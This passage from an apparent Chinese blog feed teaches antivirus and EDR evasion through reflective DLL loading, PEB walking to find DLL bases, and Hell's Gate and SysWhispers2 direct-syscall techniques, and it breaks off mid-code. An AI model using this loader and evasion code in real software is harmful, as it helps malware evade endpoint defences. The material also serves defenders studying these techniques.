WINAPI<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// patch in the address for this imported function</span><br>DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));<br></code></pre></td></tr></table></figure></li><li>修复重定位表<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock)<br>&#123;<br><span class="hljs-comment">// uiValueA = the VA for this relocation block</span><br>uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress);<br><br><span class="hljs-comment">// uiValueB = number of entries in this relocation block</span><br>uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(IMAGE_RELOC);<br><br><span class="hljs-comment">// uiValueD is now the first entry in the current relocation block</span><br>uiValueD = uiValueC + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION);<br><br><span class="hljs-comment">// we itterate through all the entries in the current block...</span><br><span class="hljs-keyword">while</span> (uiValueB--)<br>&#123;<br><span class="hljs-comment">// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.</span><br><span class="hljs-comment">// we dont use a switch statement to avoid the compiler building a jump table</span><br><span class="hljs-comment">// which would not be very position independent!</span><br><span class="hljs-keyword">if</span> (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_DIR64)<br>*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += uiLibraryAddress;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGHLOW)<br>*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += (DWORD)uiLibraryAddress;<br></code></pre></td></tr></table></figure></li><li>调用DLL的入口点<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// if we are injecting an DLL via a stub we call DllMain with no parameter</span><br>((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>最终shellcode位于dllmain中</li></ol><hr><p>参考文章：<br><a href="https://xz.aliyun.com/t/11659">https://xz.aliyun.com/t/11659</a><br><a href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a><br><a href="https://github.com/mgeeky/ThreadStackSpoofer">https://github.com/mgeeky/ThreadStackSpoofer</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取DLL基址</title>
      <link href="2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/"/>
      <url>2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="windbg查看dll基址"><a href="#windbg查看dll基址" class="headerlink" title="windbg查看dll基址"></a>windbg查看dll基址</h1><p>fs寄存器 -&gt; TEB -&gt; PEB -&gt; PEB_LDR_DATA -&gt; LIST_ENTRY -&gt; LDR_DATA_TABLE_ENTRY -&gt; dll_base</p><a id="more"></a><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>首先写一个简单的syscall的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;winternl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll&quot;</span>)</span><br><br><span class="hljs-function">EXTERN_C NTSTATUS <span class="hljs-title">SysNtCreateFile</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">PHANDLE FileHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER AllocationSize,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG FileAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG ShareAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG CreateDisposition,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG CreateOptions,</span></span><br><span class="hljs-function"><span class="hljs-params">PVOID EaBuffer,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG EaLength)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>FARPROC addr = GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;NtCreateFile&quot;</span>);<br><br>OBJECT_ATTRIBUTES oa;<br>HANDLE fileHandle = <span class="hljs-literal">NULL</span>;<br>NTSTATUS status = <span class="hljs-literal">NULL</span>;<br>UNICODE_STRING fileName;<br>IO_STATUS_BLOCK osb;<br><br>RtlInitUnicodeString(&amp;fileName, (PCWSTR)<span class="hljs-string">L&quot;\\??\\c:\\temp\\test.txt&quot;</span>);<br>ZeroMemory(&amp;osb, <span class="hljs-keyword">sizeof</span>(IO_STATUS_BLOCK));<br>InitializeObjectAttributes(&amp;oa, &amp;fileName, OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>SysNtCreateFile(<br>&amp;fileHandle,<br>FILE_GENERIC_WRITE,<br>&amp;oa,<br>&amp;osb,<br><span class="hljs-number">0</span>,<br>FILE_ATTRIBUTE_NORMAL,<br>FILE_SHARE_WRITE,<br>FILE_OVERWRITE_IF,<br>FILE_SYNCHRONOUS_IO_NONALERT,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译生成exe文件，然后丢进windbg里面进行调试<br>windbg常用的几个指令</p><ol><li>bp（breakpoint）</li><li>g（goto）</li><li>dt（dump using type information）</li><li>dv（dump local variables）</li><li>k（stacktrace）</li></ol><p>这样的话，我们先来分析下TEB的数据结构<code>dt _TEB</code><br><img src="https://s2.loli.net/2022/11/12/o9g5R3rYb7ctkBs.png" alt="TEB数据结构"><br>可以发现在0x060的偏移处存放的是进程环境块PEB的指针</p><p>接着我们继续跟进，插卡PEB的数据结构<code>dt _PEB</code><br><img src="https://s2.loli.net/2022/11/12/gf8hqV5Oi7beAE9.png" alt="PEB数据结构"><br>可以看到0x018的偏移处存放的是PEB_LDR_DATA结构体的指针</p><p>继续跟进PEB_LDR_DATA数据结构<br><img src="https://s2.loli.net/2022/11/12/YgBw5z72tTyibfa.png" alt="PEB_LDR_DATA数据结构"><br>可以看到在0x020的偏移出存放的是_LIST_ENTRY指针<br>根据其名字变量名<code>InMemoryOrderModuleList</code>可以看出是按照内存中顺序的模块链表</p><p>继续跟进就能看到该<code>_LIST_ENTRY</code>为双向链表<br><img src="https://s2.loli.net/2022/11/12/zL6bA2oT34i1VEp.png" alt="LIST_ENTRY"><br>既然是双向链表，那肯定继续指出了下一步的指针，但这里无法明确的看出，我们需要去MSDN进行查询</p><p>通过查询<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">MSDN</a><br>可以知道，这里对应的是<code>LDR_DATA_TABLE_ENTRY</code>这个结构体</p><p>那我们继续跟进这个结构体<code>dt _LDR_DATA_TABLE_ENTRY</code>，也就是该链表实际指向的内容<br><img src="https://s2.loli.net/2022/11/12/zL6bA2oT34i1VEp.png" alt="LDR_DATA_TABLE_ENTRY"><br>可以看到这里偏移0x018的位置，存放的就是DLL基地址，同时还存有FullDllName和BaseDllName可以帮助我们区分是哪个DLL</p><h2 id="代码遍历模块链表"><a href="#代码遍历模块链表" class="headerlink" title="代码遍历模块链表"></a>代码遍历模块链表</h2><p>模块链表是一个双向循环链表，以下以遍历InLoadOrderModuleList举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span></span><br><span class="hljs-class">&#123;</span><br>_LIST_ENTRY* Flink;<br>_LIST_ENTRY* Blink;<br>&#125;_LIST_ENTRY;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">UNICODE_STRING</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> Length;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> MaximumLength;<br><span class="hljs-keyword">wchar_t</span>* Buffer;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span>* pPEB = <span class="hljs-literal">NULL</span>;<br><br>__asm<br>&#123;<br>push eax<br>mov eax,fs:[<span class="hljs-number">0x30</span>]<br>mov pPEB,eax<br>pop eax<br>&#125;<br><br><span class="hljs-keyword">int</span>* pIDR = (<span class="hljs-keyword">int</span>*)(*(pPEB + <span class="hljs-number">0x03</span>)); <span class="hljs-comment">//0x03 * 4 = 0x0c</span><br><br>_LIST_ENTRY* pInLoadOrderModuleList = (_LIST_ENTRY*)(pIDR + <span class="hljs-number">0x03</span>); <span class="hljs-comment">//0x03 * 4 = 0x0c</span><br><br>_LIST_ENTRY* pHead, *p;<br>p = pHead = pInLoadOrderModuleList-&gt;Flink;<br><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: &quot;</span>, count++);<br>_UNICODE_STRING* pBaseName = (_UNICODE_STRING*)(((<span class="hljs-keyword">int</span>)p) + <span class="hljs-number">0x2c</span>);<br><span class="hljs-keyword">if</span> (pBaseName-&gt;Buffer)<br>wprintf(<span class="hljs-string">L&quot;%s &quot;</span>, pBaseName-&gt;Buffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, *((<span class="hljs-keyword">int</span>*)(((<span class="hljs-keyword">int</span>)p) + <span class="hljs-number">0x18</span>)));<br><span class="hljs-comment">//</span><br>p = p-&gt;Flink;<br>&#125; <span class="hljs-keyword">while</span> (p != pHead);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前置知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>规避“系统调用标记”</title>
      <link href="2022/11/12/%E8%A7%84%E9%81%BF%E2%80%9C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%A0%87%E8%AE%B0%E2%80%9D/"/>
      <url>2022/11/12/%E8%A7%84%E9%81%BF%E2%80%9C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%A0%87%E8%AE%B0%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="规避“系统调用标记”"><a href="#规避“系统调用标记”" class="headerlink" title="规避“系统调用标记”"></a>规避“系统调用标记”</h1><p>规避常见的恶意API调用模式及使用直接系统调用并规避“系统调用标记”，来bypass edr</p><a id="more"></a><h2 id="直接使用系统调用"><a href="#直接使用系统调用" class="headerlink" title="直接使用系统调用"></a>直接使用系统调用</h2><p>在用户态运行的系统要控制系统时，或者要运行系统代码就必须取得R0权限。用户从R3到R0需要借助ntdll.dll中的函数，这些函数分别以“Nt”和“Zw”开头，这种函数叫做Native API，下图是调用过程：<br><img src="https://s2.loli.net/2022/11/12/Nwn5hHyOCR8pEDe.png"><br>这些nt开头的函数一般没有官方文档，很多都是被逆向或者泄露windows源码的方式流出的。</p><p><code>FARPROC addr = GetProcAddress(LoadLibraryA(&quot;ntdll&quot;), &quot;NtCreateFile&quot;);</code><br>我们可以通过在内存中找到函数的首地址来调用这些nt开头的函数</p><p>在反编译syscall函数之后，可以得到一段非常具有特征的汇编指令</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10</span>,rcx<br><span class="hljs-keyword">mov</span>     eax,xxh<br><span class="hljs-symbol">syscall</span><br></code></pre></td></tr></table></figure><p>用户调用windows api ReadFile，有些edr会hook ReadFile这个windows api，但实际上最终会调用到NTxxx这种函数。有些函数没有被edr hook就可以绕过。说白了还是通过黑名单机制的一种绕过。找到冷门的wdinwos api并找到对应的底层内核api</p><p>这里有个很好的网站<a href="https://j00ru.vexillium.org/syscalls/nt/64/">sycall系统调用号文档</a><br>因为syscall在这里存储的是系统调用号</p><p>我们可以在visual studio中直接反编译查看汇编代码与字节码<br>工具-&gt;选项-&gt;启用地址级调试<br>在调试过程中，Debug-&gt;window-&gt;disassembly</p><h2 id="动态进行syscall"><a href="#动态进行syscall" class="headerlink" title="动态进行syscall"></a>动态进行syscall</h2><p>我们很多时候使用syscall不是直接调用，不会在代码里硬编码syscall的系统调用号。因为不同的系统调用号是不同的，所以我们需要进行动态syscall<br>这里我们可以直接使用Hell’s Gate来遍历NtDLL的导出表，根据函数名hash，找到函数的地址。接着使用0xb8获取到系统调用号，之后通过syscall来执行一系列函数<br>通过TEB获取到dll的地址可以参考：<a href="https://silver-glacier.github.io/2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/">前置知识</a></p><p>接下来我们的步骤是</p><ol><li>解析pe结构，获取导出表</li><li>遍历hash表和导出表，找到syscall的函数，通过标记的方式获得系统调用号</li><li>调用syscall，分配内存，修改内存属性，创建线程</li></ol><p>这些在Hell’s Hate已经实现，我们重点来看一下这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0x4c</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + cw) == <span class="hljs-number">0x8b</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + cw) == <span class="hljs-number">0xd1</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + cw) == <span class="hljs-number">0xb8</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + cw) == <span class="hljs-number">0x00</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">7</span> + cw) == <span class="hljs-number">0x00</span>) &#123;<br>          BYTE high = *((PBYTE)pFunctionAddress + <span class="hljs-number">5</span> + cw);<br>          BYTE low = *((PBYTE)pFunctionAddress + <span class="hljs-number">4</span> + cw);<br>          pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; <span class="hljs-number">8</span>) | low;<br>          <span class="hljs-keyword">break</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>为什么匹配这几个字节就能找到syscall调用号<br>这里有张图很明确<br><img src="https://s2.loli.net/2022/11/12/PZxEp96fFIB8i2N.png"><br>可以看到syscall的汇编语句比较固定</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-number">4</span>C8BD1 -&gt; <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br><span class="hljs-symbol">B8XXXXXXXX</span> -&gt; move eax,xx<br><span class="hljs-number">0</span>f05 -&gt; syscall<br></code></pre></td></tr></table></figure><p>而我们逐个字节进行遍历，直到出现mov r10, rcx和move eax，经过位运算得到syscall调用号<br>这是我们生成的syscall</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-comment">; Hell&#x27;s Gate</span><br>  <span class="hljs-comment">; Dynamic system call invocation </span><br>  <span class="hljs-comment">; </span><br>  <span class="hljs-comment">; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)</span><br><br>  <span class="hljs-meta">.data</span><br>      wSystemCall DWORD <span class="hljs-number">000</span>h<br><br>  <span class="hljs-meta">.code</span> <br>      HellsGate <span class="hljs-meta">PROC</span><br>          <span class="hljs-keyword">mov</span> wSystemCall, <span class="hljs-number">000</span>h<br>          <span class="hljs-keyword">mov</span> wSystemCall, ecx<br>          ret<br>      HellsGate <span class="hljs-meta">ENDP</span><br><br>      HellDescent <span class="hljs-meta">PROC</span><br>          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br>          <span class="hljs-keyword">mov</span> eax, wSystemCall<br><br>          syscall<br>          ret<br>      HellDescent <span class="hljs-meta">ENDP</span><br>  <span class="hljs-meta">end</span><br></code></pre></td></tr></table></figure><h2 id="SysWhispers2"><a href="#SysWhispers2" class="headerlink" title="SysWhispers2"></a>SysWhispers2</h2><p><a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a> 是一个合集，用python生成.c源码文件。这些文件的作用和Hell’s Gate类似，也是在PE中找导出表，之后通过对比函数hash找到syscall调用号。相对Hell’s Gate有更多的函数可供选择，不仅仅是内存相关的几个函数。并且对syscall的asm有一定程度的混淆(使用了INT 2EH替换sycall)</p><p>我们在动态使用syscall的时候已经发现了，syscall反编译之后的汇编语句比较固定，那这么这样的话syscall特征非常明显,静态特征就很容易被识别到<br>对于这个问题，SysWhispers2做出了相应的解决办法</p><blockquote><p>egghunter<br>在fuzzysecurity的<a href="https://www.fuzzysecurity.com/tutorials/expDev/4.html">二进制教程</a>中提到过相关技术<br>先用彩蛋（一些随机的、唯一的、可识别的模式）替换syscall指令，然后在运行时，再在内存中搜索这个彩蛋，并使用ReadProcessMemory和WriteProcessMemory等WINAPI调用将其替换为syscall指令。之后，我们可以正常使用直接系统调用了<br>我们在内存中使用db表示一个字节，比如我们在内存中.txt段写入”w00tw00t”的字节</p></blockquote><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-symbol">NtAllocateVirtualMemory</span> <span class="hljs-meta">PROC</span><br>  <span class="hljs-keyword">mov</span> [rsp +<span class="hljs-number">8</span>], rcx          <span class="hljs-comment">; Save registers.</span><br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">16</span>], rdx<br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">24</span>], <span class="hljs-built_in">r8</span><br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">32</span>], <span class="hljs-built_in">r9</span><br>  <span class="hljs-keyword">sub</span> rsp, <span class="hljs-number">28</span>h<br>  <span class="hljs-keyword">mov</span> ecx, <span class="hljs-number">003970</span>B07h        <span class="hljs-comment">; Load function hash into ECX.</span><br>  call SW2_GetSyscallNumber  <span class="hljs-comment">; Resolve function hash into syscall number.</span><br>  <span class="hljs-keyword">add</span> rsp, <span class="hljs-number">28</span>h<br>  <span class="hljs-keyword">mov</span> rcx, [rsp +<span class="hljs-number">8</span>]          <span class="hljs-comment">; Restore registers.</span><br>  <span class="hljs-keyword">mov</span> rdx, [rsp+<span class="hljs-number">16</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, [rsp+<span class="hljs-number">24</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, [rsp+<span class="hljs-number">32</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br>  DB <span class="hljs-number">77</span>h                     <span class="hljs-comment">; &quot;w&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">74</span>h                     <span class="hljs-comment">; &quot;t&quot;</span><br>  DB <span class="hljs-number">77</span>h                     <span class="hljs-comment">; &quot;w&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">74</span>h                     <span class="hljs-comment">; &quot;t&quot;</span><br>  ret<br><span class="hljs-symbol">NtAllocateVirtualMemory</span> <span class="hljs-meta">ENDP</span><br></code></pre></td></tr></table></figure><p>接下来遍历全文，去寻找我们埋下的彩蛋</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FindAndReplace</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> egg[], <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> replace[])</span></span><br><span class="hljs-function"></span>&#123;<br><br>    ULONG64 startAddress = <span class="hljs-number">0</span>;<br>    ULONG64 size = <span class="hljs-number">0</span>;<br><br>    GetMainModuleInformation(&amp;startAddress, &amp;size);<br><br>    <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error detecting main module size&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    ULONG64 currentOffset = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* current = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*));<br>    <span class="hljs-keyword">size_t</span> nBytesRead;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starting search from: 0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);<br><br>    <span class="hljs-keyword">while</span> (currentOffset &lt; size - <span class="hljs-number">8</span>)<br>    &#123;<br>        currentOffset++;<br>        LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);<br>        <span class="hljs-keyword">if</span>(DEBUG &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Searching at 0x%llu\n&quot;</span>, (ULONG64)currentAddress);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ReadProcessMemory((HANDLE)((<span class="hljs-keyword">int</span>)<span class="hljs-number">-1</span>), currentAddress, current, <span class="hljs-number">8</span>, &amp;nBytesRead)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error reading from memory\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (nBytesRead != <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error reading from memory\n&quot;</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(DEBUG &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nBytesRead; 